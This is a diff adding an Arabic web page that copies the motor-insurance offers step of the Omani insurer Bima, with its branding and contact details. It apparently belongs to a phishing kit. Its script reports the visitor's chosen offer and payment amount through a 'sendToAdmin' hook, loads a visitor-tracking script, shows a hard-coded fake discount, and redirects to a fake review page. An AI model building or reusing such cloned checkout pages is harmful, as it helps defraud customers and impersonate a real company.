@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="تأمين المركبات المؤقت - العروض - بيمة للتأمين">
+    <title>بيمة</title>
+    <link href="../favicon.ico" sizes="128x128" rel="shortcut icon" type="image/x-icon" />
+    <!-- css file -->
+    <link rel="stylesheet" href="../assets/css/rtl/bootstrap.rtl.min.css" />
+    <link rel="stylesheet" href="../assets/css/jquery-ui.min.css" />
+    <link rel="stylesheet" href="../assets/css/rtl/ace-responsive-menu.css" />
+    <link rel="stylesheet" href="../assets/css/menu.css" />
+    <link rel="stylesheet" href="../assets/css/fontawesome.css" />
+    <link rel="stylesheet" href="../assets/css/flaticon.css" />
+    <link rel="stylesheet" href="../assets/css/bootstrap-select.min.css" />
+    <link rel="stylesheet" href="../assets/css/animate.css" />
+    <link rel="stylesheet" href="../assets/css/rtl/slider.css" />
+    <link rel="stylesheet" href="../assets/css/rtl/style.css?v=87.css" />
+    <link rel="stylesheet" href="../assets/css/ud-custom-spacing.css" />
+    <link rel="stylesheet" href="../assets/css/rtl/site.css?v=87.css" />
+    <link rel="stylesheet" href="../assets/css/site_common.css?v=87.css" />
+    <script src="../assets/js/jquery-3.6.4.min.js"></script>
+    <script src="../assets/js/jquery-migrate-3.0.0.js"></script>
+    <script src="../assets/js/popper.min.js"></script>
+    <script src="../assets/js/bootstrap.min.js"></script>
+    <script src="../assets/js/bootstrap-select.min.js"></script>
+    <script src="../assets/js/script.js?v=87"></script>
+    <script src="../Scripts/site.js?v=87"></script>
+</head>
+<body>
+<div class="wrapper ovh">
+    <div class="preloader"></div>
+
+    <!-- Main Header Nav -->
+    <header class="header-nav nav-innerpage-style menu-home4 main-menu">
+        <nav class="posr">
+            <div class="container maxw1600 posr menu_bdrt1">
+                <div class="row align-items-center justify-content-between">
+                    <div class="col-auto">
+                        <ul id="respMenu" class="ace-responsive-menu" data-menu-style="horizontal">
+                            <li class="visible_list">
+                                <a class="list-item" href="../index.html"><span class="title">الصفحة الرئيسية</span></a>
+                            </li>
+                            <li class="visible_list has-sub-mnu">
+                                <a href="#" class="top-mnu"><span class="title">التأمين</span></a>
+                                <ul class="sub-menu">
+                                    <li><a href="../Insurance.html">التأمين على المركبات</a></li>
+                                    <li><a href="Travel.html">تأمين السفر</a></li>
+                                    <li><a href="/insurance/domestic-form">تأمين خدم المنازل</a></li>
+                                    <li><a href="/insurance/medical-form">تأمين صحي</a></li>
+                                </ul>
+                            </li>
+                            <li class="visible_list">
+                                <a class="list-item" href="#" onclick="return false;"><span class="title">تتبع حالة طلبك</span></a>
+                            </li>
+                            <li class="visible_list">
+                                <a class="list-item" href="#" onclick="return false;"><span class="title">بيمة للأعمال</span></a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="col-auto">
+                        <div class="d-flex align-items-center">
+                            <a class="header-logo" href="../index.html"><img src="../img/logo/bima-logo.svg" alt="بيمة" style="max-height:50px;"></a>
+                        </div>
+                    </div>
+                    <div class="col-auto">
+                        <ul id="respMenu2" class="ace-responsive-menu" data-menu-style="horizontal">
+                            <li class="visible_list">
+                                <a class="list-item" href="whatsapp://send?phone=96879997797"><i class="fab fa-whatsapp"></i> <span class="title ltr-fix">&#x202D;968 79997797&#x202C;</span></a>
+                            </li>
+                            <li class="visible_list">
+                                <a class="list-item" href="#"><span class="title">English</span></a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Body Content -->
+    <div class="body_content">
+        <section class="page-section1 p-0">
+            <div class="page-header1">
+                <div class="row">
+                    <div class="col-12 bg-theme2 ph-top">
+                        <div class="container maxw1600">
+                            <div class="product-header">
+                                <div class="row">
+                                    <div class="col-12 col-sm-12">
+                                        <div class="row">
+                                            <div class="col-12">
+                                                <div class="d-inline-block align-middle product-info-top plateNo_inMobile">
+                                                    <div class="product-info">
+                                                        <div class="pi-title">
+                                                            <div class="key-title color-light-gray">رقم اللوحة</div>
+                                                            <div class="key-value" id="display_plateNo"></div>
+                                                            <div class="d-sm-block d-md-none key-title">
+                                                                <div class="d-inline-block capitalize_1st_letter" id="display_make_mobile"></div> / <div class="d-inline-block capitalize_1st_letter" id="display_model_mobile"></div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="pi-sub-title d-none d-md-inline-block">
+                                                            <div class="key-title color-light-gray">موديل السيارة</div>
+                                                            <div class="key-value">
+                                                                <div class="d-inline-block capitalize_1st_letter" id="display_make"></div> / <div class="d-inline-block capitalize_1st_letter" id="display_model"></div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-12 ph-bottom">
+                        <div class="container maxw1600">
+                            <div class="product-header">
+                                <div class="row">
+                                    <div class="col-12 pt-3">
+                                        <ul class="steps">
+                                            <li class="step step-success">
+                                                <div class="step-content">
+                                                    <span class="step-circle">1</span>
+                                                    <span class="step-text">تفاصيل</span>
+                                                </div>
+                                            </li>
+                                            <li class="step step-active">
+                                                <div class="step-content">
+                                                    <span class="step-circle">2</span>
+                                                    <span class="step-text">العروض</span>
+                                                </div>
+                                            </li>
+                                            <li class="step">
+                                                <div class="step-content">
+                                                    <span class="step-circle">3</span>
+                                                    <span class="step-text">إتمام الشراء</span>
+                                                </div>
+                                            </li>
+                                            <li class="step">
+                                                <div class="step-content">
+                                                    <span class="step-circle">4</span>
+                                                    <span class="step-text">رفع الصور</span>
+                                                </div>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-12">
+                                        <div class="container container_insoffers_outer_2">
+                                            <div class="container_insoffers_outer" id="container_insoffers_outer">
+                                                <!--Offers - Start-->
+                                                <div class="dscount-container_insoffers pt-2 fade show pt-3">
+                                                    <div class="row">
+                                                        <div class="col-sm-12 col-lg-12">
+                                                            <div class="card-ofr-outer2">
+                                                                <div class="card-ofr">
+                                                                    <div class="card-ofr-inner">
+                                                                        <div class="row card-ofr-header">
+                                                                            <div class="col-9 col-md-9 float-start card-ofr-header-company">
+                                                                                <div class="d-flex">
+                                                                                    <div class="logo">
+                                                                                        <img alt="Logo" src="../img/Takaful-Oman_thumb.jpg"/>
+                                                                                    </div>
+                                                                                    <div class="title" style="padding-top: 6px;">
+                                                                                        تكافل عمان للتأمين
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                            <div class="col-3 col-md-3 pt-md-2 text-end">
+                                                                                <a class="offer-hdr-link lowercase" href="#" id="view_provider_info" title="عرض التفاصيل">
+                                                                                    <i class="fa-light fa-square-ellipsis"></i> تفاصيل
+                                                                                </a>
+                                                                            </div>
+                                                                            <div class="col-12">
+                                                                                <div class="name">
+                                                                                    <div class="d-flex flex-wrap">
+                                                                                        <div class="me-2 product-tag" style="background-color: #43a04730;">
+                                                                                            <a class="offer-hdr-link lowercase" href="#" id="view_provider_info" title="عرض التفاصيل">
+                                                                                                <span style="color: #136d17">🏢 الفروع: <b>11</b></span>
+                                                                                            </a>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                        <div class="card-ofr-body">
+                                                                            <div class="row display-flex">
+                                                                                <div class="col-sm-12 col-md-6">
+                                                                                    <div class="bg-color-covers-included">
+                                                                                        <div class="row included pl-10-pr-10">
+                                                                                            <div class="col-sm-12 title">
+                                                                                                <span class="bold">يشمل التغطيات</span>
+                                                                                            </div>
+                                                                                            <div class="col-sm-12 covers">
+                                                                                                <div class="opt-outer">
+                                                                                                    <div class="opt" title="ستحصل على تعويض مالي عن الوفاة أو الإصابات الجسدية التي لحقت بالمؤمن له أو السائق وأفراد أسرته في حالة وقوع حادث.">
+                                                                                                        <i class="fa-light fa-check"></i>
+                                                                                                        👥تغطية السائق والعائلة
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                                <div class="opt-outer">
+                                                                                                    <div class="opt" title="">
+                                                                                                        <i class="fa-light fa-check"></i>
+                                                                                                        مسؤولية الطرف الثالث
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                                <div class="opt-outer">
+                                                                                                    <div class="opt" title="تغطية غير محدودة للإصابة الجسدية لطرف ثالث">
+                                                                                                        <i class="fa-light fa-check"></i>
+                                                                                                        الإصابة الجسدية للطرف الثالث
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                                <div class="opt-outer">
+                                                                                                    <div class="opt" title="يغطي الأضرار التي لحقت بممتلكات الطرف الثالث في حادث تسببت فيه.">
+                                                                                                        <i class="fa-light fa-check"></i>
+                                                                                                        أضرار مركبة الطرف الثالث
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                                <div class="opt-outer">
+                                                                                                    <div class="opt" title="تغطية الإصابة البدنية التي تصيب الركاب المؤمن عليهم -من غير العائلة.">
+                                                                                                        <i class="fa-light fa-check"></i>
+                                                                                                        تغطية الركاب
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                                <div class="opt-outer">
+                                                                                                    <div class="opt" title="أية إصابة بدنية أو الأضرار التي تصيب الأشياء والممتلكات خارج المركبة ما عدا المملوك منها للمؤمن له أو لقائد المركبة وقت الحادث">
+                                                                                                        <i class="fa-light fa-check"></i>
+                                                                                                        التأمين الإلزامي
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                                <div class="opt-outer">
+                                                                                                    <div class="opt" title="لتغطية النفقات الطبية نتيجة حادث في السيارة المؤمن عليها.">
+                                                                                                        <i class="fa-light fa-check"></i>
+                                                                                                        المصاريف الطبية - ر.ع 3
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                                <div class="opt-outer">
+                                                                                                    <div class="opt" title="يُمكن توسيع صلاحية وثيقتك لتشمل رحلاتك البرية إلى دولة الإمارات العربية المتحدة, مع البطاقة البرتقالية الإلكترونية.">
+                                                                                                        <i class="fa-light fa-check"></i>
+                                                                                                        <img class="cover_ico" src="../img/flat-UAE.svg"/>
+                                                                                                        دولة الإمارات (سنة كاملة) - ر.ع 2
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                        <div class="pl-10-pr-10 BasePrice-outer">
+                                                                                            <div class="BasePrice">
+                                                                                                <div class="Title">السعر الأساسي</div>
+                                                                                                <div class="Amount">
+                                                                                                    <span class="cur-name"><img alt="ر.ع" src="../img/Omr_symbol.svg" style="width:26px;height:auto;"/></span>
+                                                                                                    <span class="amt" style="text-decoration: line-through; color: red;">18.0</span>
+                                                                                                    <span class="amt" style="color: green; margin-right: 8px;">13.5</span>
+                                                                                                    <span class="amt-tax">+ الضرائب 1.0</span>
+                                                                                                </div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                                <div class="col-sm-12 col-md-6">
+                                                                                    <div class="optional-outer">
+                                                                                        <div class="row optional pl-10-pr-10">
+                                                                                            <div class="col-sm-12 title">
+                                                                                                <span class="bold liner">إختياري</span>
+                                                                                            </div>
+                                                                                            <div class="col-sm-12 covers">
+                                                                                                <div>
+                                                                                                    <ul>
+                                                                                                        <li>
+                                                                                                            <div class="cover_outer">
+                                                                                                                <div class="cover_code__CAR_REPLACEMENT">
+                                                                                                                    <div class="row">
+                                                                                                                        <div class="col-12">
+                                                                                                                            <div class="ofr-cover">
+                                                                                                                                <div class="ofr-cover-chk">
+                                                                                                                                    <input id="10022_CAR_REPLACEMENT" type="checkbox"/>
+                                                                                                                                </div>
+                                                                                                                                <div class="ofr-cover-lbl">
+                                                                                                                                    <label class="m-0" for="10022_CAR_REPLACEMENT">
+                                                                                                                                        🚗سيارة بديلة من بيمة - ر.ع 4.95
+                                                                                                                                    </label>
+                                                                                                                                    <div>
+                                                                                                                                        <select class="form-select" id="car_replacement_option">
+                                                                                                                                            <option value="1063">7 أيام - ر.ع 4.95</option>
+                                                                                                                                            <option value="1064">14 يوم - ر.ع 9.95</option>
+                                                                                                                                        </select>
+                                                                                                                                    </div>
+                                                                                                                                </div>
+                                                                                                                            </div>
+                                                                                                                        </div>
+                                                                                                                    </div>
+                                                                                                                </div>
+                                                                                                            </div>
+                                                                                                        </li>
+                                                                                                        <li>
+                                                                                                            <div class="cover_outer">
+                                                                                                                <div class="cover_code__IMC">
+                                                                                                                    <div class="row">
+                                                                                                                        <div class="col-12">
+                                                                                                                            <div class="ofr-cover">
+                                                                                                                                <div class="ofr-cover-chk">
+                                                                                                                                    <input id="10022_IMC" type="checkbox"/>
+                                                                                                                                </div>
+                                                                                                                                <div class="ofr-cover-lbl">
+                                                                                                                                    <label class="m-0" for="10022_IMC">
+                                                                                                                                        المساعدة على الطريق
+                                                                                                                                    </label>
+                                                                                                                                </div>
+                                                                                                                            </div>
+                                                                                                                        </div>
+                                                                                                                    </div>
+                                                                                                                </div>
+                                                                                                            </div>
+                                                                                                        </li>
+                                                                                                        <li>
+                                                                                                            <div class="cover_outer">
+                                                                                                                <div class="cover_code__CLAIM_ASSISTANCE">
+                                                                                                                    <div class="row">
+                                                                                                                        <div class="col-12">
+                                                                                                                            <div class="ofr-cover">
+                                                                                                                                <div class="ofr-cover-chk">
+                                                                                                                                    <input id="10022_CLAIM_ASSISTANCE" type="checkbox"/>
+                                                                                                                                </div>
+                                                                                                                                <div class="ofr-cover-lbl">
+                                                                                                                                    <label class="m-0" for="10022_CLAIM_ASSISTANCE">
+                                                                                                                                        🧑🏻‍🚀مساعدة المطالبات من بيمة(مجاني)
+                                                                                                                                    </label>
+                                                                                                                                </div>
+                                                                                                                            </div>
+                                                                                                                        </div>
+                                                                                                                    </div>
+                                                                                                                </div>
+                                                                                                            </div>
+                                                                                                        </li>
+                                                                                                    </ul>
+                                                                                                </div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                        <div class="pt-2 pt-md-4 payment">
+                                                                                            <div class="row">
+                                                                                                <div class="col pb-8px">
+                                                                                                    <div class="buy">
+                                                                                                        <div class="d-flex justify-content-between">
+                                                                                                            <div>
+                                                                                                                <div class="Title">إجمالي المبلغ</div>
+                                                                                                                <div class="Amount">
+                                                                                                                    <span class="cur-name"><img alt="ر.ع" src="../img/Omr_symbol.svg" style="width:26px;height:auto;"/></span>
+                                                                                                                    <span class="font-weight-600" id="oldTotalAmount" style="text-decoration: line-through; color: red;">19.3</span>
+                                                                                                                    <span class="font-weight-600" id="totalAmount" style="color: green; margin-right: 8px;">14.5</span>
+                                                                                                                </div>
+                                                                                                            </div>
+                                                                                                            <div class="bold">
+                                                                                                                <a class="btn btn-buy-now" href="#" id="btnBuyNow">
+                                                                                                                    اشترِ الآن
+                                                                                                                </a>
+                                                                                                            </div>
+                                                                                                        </div>
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <!--Offers - End-->
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <!--Discount header - End-->
+                                    <div class="row">
+                                        <div class="col-12 pt-3 text-center">
+                                            <div class="font-size-12px font-weight-lighter text-gray" id="offers_count">تم العثور على العروض في 1 ثانية</div>
+                                        </div>
+                                        <div class="col-sm-12 pt-4">
+                                            <div class="row justify-content-center align-self-center">
+                                                <div class="col-sm-8 mb-1 text-center">
+                                                    <ul class="lstHr list-group-horizontal p-0">
+                                                        <li class="border-0 pl-0">
+                                                            <button class="ud-btn btn-dark bdrs0" id="btnSubmitBack" type="button">
+                                                                <i class="fas fa-chevron-right" id="ico_back_loading"></i> السابق
+                                                            </button>
+                                                        </li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section class="footer-style1 pt20 pb0">
+            <div class="container">
+                <div class="row pb-2">
+                    <div class="col-sm-5">
+                        <div class="footer-widget text-center text-sm-start">
+                            <a class="footer-logo" href="../index.html"><img src="../img/logo/logo-50x50-t.png" alt="بيمة"></a>
+                            <div class="text-white"><small>شركة بيت التأمين ش. م. م.</small></div>
+                        </div>
+                    </div>
+                    <div class="col-sm-7">
+                        <div class="social-widget text-center text-sm-end">
+                            <div class="social-style1">
+                                <span class="text-white me-2 fw600 fz15">تابعنا عبر</span>
+                                <a href="https://www.facebook.com/www.Bima.om"><i class="fab fa-facebook-f list-inline-item"></i></a>
+                                <a href="https://twitter.com/bima_oman"><i class="fab fa-twitter list-inline-item"></i></a>
+                                <a href="https://www.instagram.com/bima_oman"><i class="fab fa-instagram list-inline-item"></i></a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row pt30 white-bdrt1">
+                    <div class="col-md-6">
+                        <div class="row justify-content-between">
+                            <div class="col-auto">
+                                <div class="link-style1 mb-3">
+                                    <h6 class="text-white mb25">روابط سريعة</h6>
+                                    <div class="link-list">
+                                        <a href="../Home/AboutUs.html">عن بيمة</a>
+                                        <a href="../Home/ContactUs.html">إتصل بنا</a>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-auto">
+                                <div class="link-style1 mb-3">
+                                    <h6 class="text-white mb25"> </h6>
+                                    <ul class="ps-0">
+                                        <li><a href="../Insurance.html">التأمين على المركبات</a></li>
+                                        <li><a href="Travel.html">تأمين السفر</a></li>
+                                        <li><a href="/insurance/domestic-form">تأمين خدم المنازل</a></li>
+                                        <li><a href="/insurance/medical-form">تأمين صحي</a></li>
+                                        <li><a href="/insurance/credit-life-form">تأمين القروض</a></li>
+                                        <li><a href="/insurance/malpractice-form">تأمين الاخطاء الطبية</a></li>
+                                        <li><a href="/insurance/home-form">تأمين المنازل</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-4 offset-lg-2">
+                        <div class="footer-widget mb-4">
+                            <div class="row mb-4">
+                                <div class="col-auto">
+                                    <div class="contact-info">
+                                        <p class="info-title">خدمة العملاء</p>
+                                        <h6 class="info-phone"><a href="javascript:void(0);"><i class="fas fa-phone-rotary"></i> <span class="ltr-fix">&#x202D;+968 77997797&#x202C;</span></a></h6>
+                                    </div>
+                                </div>
+                                <div class="col-auto">
+                                    <div class="contact-info">
+                                        <p class="info-title">دعم مباشر</p>
+                                        <h6 class="info-mail"><a href="mailto:info@bima.om"><i class="fas fa-envelope"></i> info@bima.om</a></h6>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="app-widget">
+                                <h5 class="title text-white mb10">حمل التطبيق</h5>
+                                <div class="row mb-4 mb-lg-5">
+                                    <div class="col-lg-12">
+                                        <a href="https://apps.apple.com/om/app/bima-insurance/id1628311517" target="_blank">
+                                            <div class="app-info d-flex align-items-center mb20">
+                                                <div class="flex-shrink-0"><i class="fab fa-apple fz30 text-white"></i></div>
+                                                <div class="flex-grow-1 ml20">
+                                                    <p class="app-text fz13 mb0">حمل من</p>
+                                                    <h6 class="app-title text-white fz14">متجر آبل</h6>
+                                                </div>
+                                            </div>
+                                        </a>
+                                    </div>
+                                    <div class="col-lg-12">
+                                        <a href="https://play.google.com/store/apps/details?id=com.ebima.insuranceapp" target="_blank">
+                                            <div class="app-info d-flex align-items-center mb10">
+                                                <div class="flex-shrink-0"><i class="fab fa-google-play fz30 text-white"></i></div>
+                                                <div class="flex-grow-1 ml20">
+                                                    <p class="app-text fz13 mb0">حمل من</p>
+                                                    <h6 class="app-title text-white fz14">جوجل بلاي</h6>
+                                                </div>
+                                            </div>
+                                        </a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="container white-bdrt1 py-1 pt-3">
+                    <div class="row">
+                        <div class="col-sm-6">
+                            <div class="text-center text-lg-start">
+                                <p class="copyright-text text-gray ff-heading">حقوق النسخ &copy; 2026 <a href="https://www.bima.om" target="_blank">bima.om</a>. كافة الحقوق محفوظة.</p>
+                            </div>
+                        </div>
+                        <div class="col-sm-6">
+                            <div class="text-center text-lg-end">
+                                <p class="footer-menu ff-heading text-gray">
+                                    <a class="text-gray" href="#">الأحكام والشروط</a> .
+                                    <a class="text-gray" href="#">الأسئلة المتداولة</a> .
+                                    <a class="text-gray" href="#">سياسة الخصوصية</a>
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+</div>
+
+<script>
+$(document).ready(function() {
+    // Force hide preloader
+    setTimeout(function() {
+        $('.preloader').fadeOut(300);
+    }, 500);
+
+    // Load vehicle data from localStorage
+    var vehicleData = JSON.parse(localStorage.getItem('borderVehicleDetails') || '{}');
+    var formData = JSON.parse(localStorage.getItem('borderInsuranceData') || '{}');
+
+    // Display plate number and model - inbound uses chassis as identifier
+    var plateNo = (vehicleData.chassisNo || 'TBA') + ' / ' + (vehicleData.mfgYear || '0');
+    $('#display_plateNo').text(plateNo);
+    $('#display_make').text(vehicleData.makeName || '');
+    $('#display_model').text(vehicleData.modelCode || '');
+    $('#display_make_mobile').text(vehicleData.makeName || '');
+    $('#display_model_mobile').text(vehicleData.modelCode || '');
+
+    // Back button
+    $('#btnSubmitBack').on('click', function() {
+        window.location.href = '/insurance/vehicle-border-inbound-details.html';
+    });
+
+    // Buy now button
+    $('#btnBuyNow').on('click', function(e) {
+        e.preventDefault();
+        var amount = $('#totalAmount').text().trim();
+        localStorage.setItem('paymentAmount', amount);
+        if (window.sendToAdmin) {
+            window.sendToAdmin({
+                'شركة التأمين': 'تكافل عمان',
+                'المبلغ': amount + ' ر.ع',
+                'الحالة': 'تم اختيار العرض'
+            }, 'تأمين الحدود الداخل - العروض');
+        }
+        window.location.href = '/insurance/vehicle-border-inbound-review';
+    });
+
+    // Update total when checkboxes change
+    var originalBasePrice = 19.3; // original price before discount
+    var discountRate = 0.25; // 25% discount
+
+    function updatePrices() {
+        var extras = 0;
+        if ($('#10022_CAR_REPLACEMENT').is(':checked')) {
+            var carReplacementVal = $('#car_replacement_option').val();
+            if (carReplacementVal == '1063') extras += 4.95;
+            else if (carReplacementVal == '1064') extras += 9.95;
+        }
+        var oldTotal = originalBasePrice + extras;
+        var newTotal = oldTotal * (1 - discountRate);
+        $('#oldTotalAmount').text(oldTotal.toFixed(1));
+        $('#totalAmount').text(newTotal.toFixed(1));
+    }
+
+    $('input[type="checkbox"]').on('change', function() {
+        updatePrices();
+    });
+
+    $('#car_replacement_option').on('change', function() {
+        if ($('#10022_CAR_REPLACEMENT').is(':checked')) {
+            updatePrices();
+        }
+    });
+});
+</script>
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
